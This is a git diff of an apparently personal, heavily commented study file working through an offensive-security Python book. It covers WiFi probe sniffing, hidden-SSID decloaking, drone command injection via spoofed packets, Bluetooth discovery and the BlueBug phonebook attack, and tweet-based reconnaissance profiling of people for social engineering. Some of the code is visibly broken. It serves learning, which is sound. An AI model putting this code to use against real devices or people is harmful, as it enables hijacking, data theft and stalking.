@@ -5,6 +5,7 @@
 import re
 import os
 import nmap
+import json
 import time
 import dpkt
 import crypt
@@ -1735,12 +1736,14 @@ def ftp_sniff(pkt):
 
 
 # Scapy works in conjunction with network interfaces. You can also
-# sniff out where certain laptops have been aka the wifi networks 
+# sniff out where certain laptops have been aka the wifi networks
 # they connect to. Phones and laptops have lists of WiFis that they
 # have connected to in the past. Computers send 802s after either
 # booting up or disconnecting from a network.
 
 saved_wifis = []
+
+
 def sniff_probe(pkt):
     if pkt.haslayer(DOT11ProbeReq):
         net_name = pkt.getlayer(DOT11ProbeReq).info
@@ -1749,54 +1752,63 @@ def sniff_probe(pkt):
             print("[+] Detected new probe request: {}".format(net_name))
 
 # Some networks hide their SSID's to avoid having it be discovered.
-# Usually 802.11 Beacon Frames contain the name of the network, but 
+# Usually 802.11 Beacon Frames contain the name of the network, but
 # on networks which have their ID's hidden, this field is left blank.
+
 
 hidden_networks = []
 unhidden_networks = []
+
+
 def sniff_dot_11(p):
     if p.haslayer(Dot11Beacon).info == '':
-        addr2 = p.getlayer(Dot11).addr2 
+        addr2 = p.getlayer(Dot11).addr2
         if addr2 not in hidden_networks:
             print("[-] Hidden SSID with mac: {}".format(addr2))
             hidden_networks.append(addr2)
 
     if p.haslayer(DOT11ProbeResp):
-        addr2 = p.getlayer(Dot11).addr2 
+        addr2 = p.getlayer(Dot11).addr2
         if (addr2 in hidden_networks) & (addr2 not in unhidden_networks):
-            net_name = p.getlayer(Dot11ProbeResp).info 
+            net_name = p.getlayer(Dot11ProbeResp).info
             print("[+] Decloaked Hidden SSID: {} for MAC: {}".format(net_name, addr2))
 
 # We know the mac address of the access points, but still we don't know
-# anything about the SSID name. To discover the hidden names, we must 
+# anything about the SSID name. To discover the hidden names, we must
 # wait for probe responses which match the earlier mac address.
 # It's crazy to think that even UAV's can be intercepted using python. In
-# fact, there's was such an attack on a US UAV with $26 apparatus years 
-# ago! The first step is to get a wireless adapter in monitor mode. A 
+# fact, there's was such an attack on a US UAV with $26 apparatus years
+# ago! The first step is to get a wireless adapter in monitor mode. A
 # paired iphone can send instructions to the UAV, yet the only security
-# mechanism protecting this connection is MAC filtering (the MAC address 
-# assigned to each network card is used to determine access to the network). Using a 
-# tcpdump, we see some UDP traffic coming into the Iphone (from the UAV I guess) on 
+# mechanism protecting this connection is MAC filtering (the MAC address
+# assigned to each network card is used to determine access to the network). Using a
+# tcpdump, we see some UDP traffic coming into the Iphone (from the UAV I guess) on
 # a port. There's another set of data going from the Iphone to the UAV. Bingo.
 
+
 NAVPORT = 5556
+
+
 def print_packet(pkt):
     if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == NAVPORT:
         raw = pkt.sprintf("%RAW.load%")
         print(raw)
 
 # The author ran this script to monitor the UAV traffic for a long time to see trends
-# (so you want to be a hacker huh?), and found several trends, such as one for landing 
+# (so you want to be a hacker huh?), and found several trends, such as one for landing
 # the plane, controlling its motion, etc.
+
 
 EMER = '290717952'
 TAKEOFF = '290718208'
+
+
 class InterceptThread(Thread):
     def __init__(self):
         Thread.__init__(self)
-        self.cur_pkt = None 
+        self.cur_pkt = None
         self.seq = 0
-        self.foundUAV = False 
+        self.foundUAV = False
 
     def run(self):
         sniff(prn=self.intercept_pkt, filter='udp port 5556')
@@ -1804,8 +1816,8 @@ class InterceptThread(Thread):
     def intercept_pkt(self, pkt):
         if self.foundUAV == False:
             print("[*] UAV found")
-            self.foundUAV = True 
-        self.cur_pkt = pkt 
+            self.foundUAV = True
+        self.cur_pkt = pkt
         raw = self.cur_pkt.sprintf("%Raw.load%")
 
         try:
@@ -1818,7 +1830,7 @@ class InterceptThread(Thread):
 
     def inject_command(self, cmd):
         ''' What's going on here? Let's assume we got the dup library (which you can take a look at in the book's code).
-        This is duplicating the current packet at each of the radio, dot11, .. layers. It then adds the command as the 
+        This is duplicating the current packet at each of the radio, dot11, .. layers. It then adds the command as the
         payload of the udp layer, forges all the other layers together, and sends the packet off. Simple!!!'''
 
         radio = dup.dupRadio(self.cur_plt)
@@ -1834,22 +1846,22 @@ class InterceptThread(Thread):
     def emergencyland(self):
         ''' Spoof a sequence and run the command '''
         spoofSeq = self.seq + 100
-        watch = 'AT*COMWDG=%i\r'%spoofSeq
-        toCmd = 'AT*REF=%i,%s\r'% (spoofSeq + 1, EMER)
+        watch = 'AT*COMWDG=%i\r' % spoofSeq
+        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, EMER)
         self.injectCmd(watch)
         self.injectCmd(toCmd)
 
     def takeoff(self):
         spoofSeq = self.seq + 100
-        watch = 'AT*COMWDG=%i\r'%spoofSeq
-        toCmd = 'AT*REF=%i,%s\r'% (spoofSeq + 1, TAKEOFF)
+        watch = 'AT*COMWDG=%i\r' % spoofSeq
+        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, TAKEOFF)
         self.injectCmd(watch)
         self.injectCmd(toCmd)
 
-# We got the sequence number we need, so we can craft our own packets to send to the drone now. Here comes the 
-# reason why we saved the current packet. We need to duplicate a lot of information from the original packet 
-# itself, and we need to be careful to copy each layer. Scapy makes it easy for us to understand each field 
-# in layers, by doing a ls(layer_name). 
+# We got the sequence number we need, so we can craft our own packets to send to the drone now. Here comes the
+# reason why we saved the current packet. We need to duplicate a lot of information from the original packet
+# itself, and we need to be careful to copy each layer. Scapy makes it easy for us to understand each field
+# in layers, by doing a ls(layer_name).
 
 # For the Dot11 layer -
 # subtype    : BitMultiEnumField                   = ('0')
@@ -1869,11 +1881,12 @@ class InterceptThread(Thread):
 # but it is pretty interesting to read! Using our functions, we can inject commands into the drone/UAV
 # using the current packet.
 
-# The fireship tool passively listened to wireless card for HTTP cookies. When an insecure wireless network 
-# was encountered, the fireship tool intercepted these cookies, which is disasterous because most session 
-# control in the web is done via cookies or tokens. Everything about these requests are the same, excpet 
+# The fireship tool passively listened to wireless card for HTTP cookies. When an insecure wireless network
+# was encountered, the fireship tool intercepted these cookies, which is disasterous because most session
+# control in the web is done via cookies or tokens. Everything about these requests are the same, excpet
 # the user agent perhaps and definitely the IP address. So how would you check this kind of cookie reuse?
 # Check the IP address! Use scapy to spit out the IP layer.
+
 
 def fire_catcher(pkt):
     raw = pkt.sprintf("%Raw.load%")
@@ -1881,10 +1894,10 @@ def fire_catcher(pkt):
     cookie_table = {}
 
     # If there's a Set in a cookie, it was just set and thus is obviously not being reused
-    # This will print a bunch of src, dst, and cookies from the network being sniffed. If 
+    # This will print a bunch of src, dst, and cookies from the network being sniffed. If
     # any two IPs have the same cookie, we know one of them is an attacker. To know which
     # one's which, we can implement a dictionary to raise an error if there's a common key.
-    
+
     if r and 'Set' not in r:
         if r[0] not in cookie_table.keys():
             cookie_table[r[0]] = pkt.getlayer(IP).src
@@ -1896,10 +1909,11 @@ def fire_catcher(pkt):
 
 # We've seen the power of sniffing networks and parsing packets. Now we can proceed to attacking
 # bluetooth devices. Using the PyBluez library, we can call functions like discover_devices to
-# list out the MAC addresses of devices nearby. The library also has a function to convert the 
+# list out the MAC addresses of devices nearby. The library also has a function to convert the
 # address to a human readable string.
 
 already_found = []
+
 
 def find_devices():
     nearby_devices = discover_devices(lookup_names=True)
@@ -1908,17 +1922,18 @@ def find_devices():
             already_found.append(addr)
             print("  {} - {}".format(addr, name))
 
-# This only finds bluetooth devices with mode set to discoverable. 
-#     "Let’s consider a trick to target the iPhone’s Bluetooth radio in hidden mode. 
+# This only finds bluetooth devices with mode set to discoverable.
+#     "Let’s consider a trick to target the iPhone’s Bluetooth radio in hidden mode.
 #     Adding 1 to the MAC address of the 802.11 Wireless Radio identifies the Bluetooth Radio MAC
 #     address for the iPhone"
 # We will sniff for the 802.11 Wireless Radio which is doable because it doesn't protect its
 # MAC address through layer-2 controls. The first three bytes of a MAC address is the OUI
-# i.e. Organizational Unique Identifier. It's crazy how much information is out there on the 
+# i.e. Organizational Unique Identifier. It's crazy how much information is out there on the
 # internet because there are actually databases which list of these manufacturers with OUIs.
 # Checking my own device's address, I saw that the first three bytes does list the manufacturer.
 # Let's listen for a device with this MAC address, so we can find the MAC address of the 802.11
 # radio.
+
 
 def wifi_print(pkt):
     iphone_oui = '88:B2:91'
@@ -1930,26 +1945,29 @@ def wifi_print(pkt):
             print("[*] Detected iphone radio mac: {}".format(wifi_mac))
 
 # Using the MAC address of the wireless radio, we will now construct MAC address
-# of the bluetooth radio. To reiterate, we had to go this long route because this 
+# of the bluetooth radio. To reiterate, we had to go this long route because this
 # particular bluetooth device is cloaked.
+
+
 def return_bt_address(addr):
 
     # The second number in the constructor specifies a base. Add 1, convert it to hex, and remove the 0x part
     # Add the colons after every two characters
     bt_addr = str(hex(int(addr.replace(':', ''), 16) + 1))[2:]
-    bt_addr = bt_addr[0:2]+":"+bt_addr[2:4]+":"+bt_addr[4:6]+":"+\
+    bt_addr = bt_addr[0:2]+":"+bt_addr[2:4]+":"+bt_addr[4:6]+":" +\
         bt_addr[6:8]+":"+bt_addr[8:10]+":"+bt_addr[10:12]
     return bt_addr
 
 # The rationale is that, even in hidden mode, the device still responds to a device name inquiry.
 # Let's talk about a bluetooth vulnerability in the RFCOMM channel. This channel emulates RS232
-# serial ports over the bluetooth L2CAP protocol. Now what does this mean in English? THe 
+# serial ports over the bluetooth L2CAP protocol. Now what does this mean in English? THe
 # RS232 port used to be how computers connected to printers, telephone modems, and the like.
-# (this has since been replaced by USB cable). L2CAP is a protocol used in bluetooth, and the 
+# (this has since been replaced by USB cable). L2CAP is a protocol used in bluetooth, and the
 # RFCOMM channel is built upon the former.
 
 # Usually RFCOMM can encrypt connections, some manufacturers forget to do so. To make a RFCOMM
 # connection, we can create a RFCOMM type socket.
+
 
 def rfcomm_conn(addr, port):
     sock = BluetoothSocket(RFCOMM)
@@ -1961,8 +1979,9 @@ def rfcomm_conn(addr, port):
         print("Port's closed homie")
 
 # The bluetooth service discovery protocol - enumerates types of profiles and services offered by
-# bluetooth devices. If you pass the function below a MAC address, it lists out the services 
+# bluetooth devices. If you pass the function below a MAC address, it lists out the services
 # given by it on the port.
+
 
 def sdp_browse(addr):
     services = find_service(address=addr)
@@ -1979,6 +1998,7 @@ def sdp_browse(addr):
 # this was easy! The tough part was actually determining what services the printer offered
 # and how.
 
+
 def print_ninja():
     try:
         bt_printer = obexftp.client(obexftp.BLUETOOTH)
@@ -1987,15 +2007,16 @@ def print_ninja():
     except:
         print("[-] Failed to print the ninja")
 
-# The BlueBug attack - using RFCOMM channels yet again. In past firmwares of phones, this 
-# channel required no authentication, so an attacker could willy nilly connect to it. The 
-# book states that AT commands are used, which different from cronjobs in the sense that 
-# cronjobs are reoccuring while AT commands run once in the future. 
+# The BlueBug attack - using RFCOMM channels yet again. In past firmwares of phones, this
+# channel required no authentication, so an attacker could willy nilly connect to it. The
+# book states that AT commands are used, which different from cronjobs in the sense that
+# cronjobs are reoccuring while AT commands run once in the future.
 #
 # Hold up, the book may very well be discussing a different sort of AT command (I presumed it
-# to be Linux's at command), but the book states that a simple AT+CPBR = 1 means the first 
+# to be Linux's at command), but the book states that a simple AT+CPBR = 1 means the first
 # contact in the phonebook o.O. Yep, the book is talking about the Hayes command set, used to
 # dial, hangup, etc.
+
 
 def blue_bug_attack():
     target_phone = "AA:BB:CC:DD:EE:FF"
@@ -2015,6 +2036,7 @@ def blue_bug_attack():
 # Chapter 6
 #####################################################################
 
+
 def view_page(url):
     browser = mechanize.Browser()
     page = browser.open(url)
@@ -2028,6 +2050,7 @@ def view_page(url):
 # make a request to a server, it logs your IP address. This can be solved by the use of VPNs or
 # proxies. Let's begin here. You can pass proxies to the requests module pretty easily by giving
 # it a dictionary.
+
 
 def test_proxy(url, proxy):
     browser = mechanize.Browser()
@@ -2046,7 +2069,8 @@ def test_proxy(url, proxy):
 
 # Finally, cookies are another way web servers determine some interesting information about clients.
 # Let's use the cookielib standard library to see what's up (this has been changed to http.cookiejar in
-# python3x, so check out the differences). 
+# python3x, so check out the differences).
+
 
 def print_cookies(url):
     browser = mechanize.Browser()
@@ -2057,4 +2081,122 @@ def print_cookies(url):
     for cookie in cookie_jar:
         print(cookie)
 
-# Now the book proceeds into discussing beautifulsoup.
+# Now the book proceeds into discussing beautifulsoup. One thing you need to remember is that there's no
+# anonymity if an API requires an API key, unless you get those from somewhere else too.
+
+# Now the book goes into writing a class to hold big json responses like these in an easier
+# format for effective use, which is good to practice. It can be as simple as you like!
+
+
+class Google_Result:
+    def __init__(self, title, text, url):
+        self.title = title
+        self.text = text
+        self.url = url
+
+    # Once again, creating this class changes the string representation of this class
+    def __repr__(self):
+        return self.title
+
+# This API is no longer working, but you get the gist of what it's doing. More importantly, check out the
+# sort of functions at use here, especially stuff like urllibb.parse's quote_plus, which takes a string
+# and adds plus's to spaces, which is required for a google query.
+
+
+def make_json(search_term):
+    br = mechanize.Browser()
+    search_term = urllib.parse.quote_plus(search_term)
+    response = br.open(('http://ajax.googleapis.com/' +
+                        'ajax/services/search/web?v=1.0&q=' + search_term))
+    objects = json.load(response)
+    results = []
+
+    for result in objects['responseData']['results']:
+        url = result['url']
+        title = result['titleNoFormatting']
+        text = result['content']
+        new_gr = Google_Result(title, text, url)
+        results.append(new_gr)
+
+    return results
+
+
+class ReconPerson:
+    def __init__(self, first_name, last_name, job='', social_media={}):
+        self.first_name = first_name
+        self.last_name = last_name
+        self.job = job
+        self.social_media = social_media
+
+    def __repr__(self):
+        return self.first_name + ' ' + \
+            self.last_name + ' has job ' + self.job
+
+    def get_social(self, media_name):
+        if media_name in self.social_media.keys():
+            return self.social_media[media_name]
+
+        return None
+
+    def query_twitter(self, query):
+        query = urllib.parse.quote_plus(query)
+        results = []
+        browser = mechanize.Browser()
+        response = browser.open(
+            'http://search.twitter.com/search.json?q=' + query)
+        json_objects = json.load(response)
+
+        for result in json_objects['results']:
+            new_result = {}
+            new_result['from_user'] = result['from_user_name']
+            new_result['geo'] = result['geo']
+            new_result['tweet'] = result['text']
+            results.append(new_result)
+
+# This much was peanuts to the experienced coder, so let's get into something more exciting.
+# Location data.
+
+# We're using the cities file from which we get a big selection of cities.
+
+
+def load_cities(city_file):
+    cities = []
+
+    for line in open(city_file).readlines():
+        city = line.strip('\n').strip('\r').lower()
+        cities.append(city)
+        return cities
+
+# What this function basically is doing is that it's checking whether the 'geo' geolocation key exists in
+# tweet text.
+
+
+def twitter_locate(tweets, cities):
+    locations = []
+    loc_cnt = 0
+    city_cnt = 0
+    tweets_txt = ""
+
+    for tweet in tweets:
+        if tweet['geo']:
+            locations.append(tweet['geo'])
+            loc_cnt += 1
+            tweets_txt += tweet['tweet'].lower()
+
+    for city in cities:
+        if city in tweets_txt:
+            locations.append(city)
+            city_cnt += 1
+
+    print("[+] Found {} locations via Twitter API and {} "
+          "locations from text search.".format(str(loc_cnt), str(loc_cnt)))
+
+    return locations
+
+# Points of interest for Twitter users (or any website for that matter) is a
+# good target for a social engineering attack. Links, mentions, etc, everything is
+# fair game.
+
+
+def find_interests(tweets):
+    pass
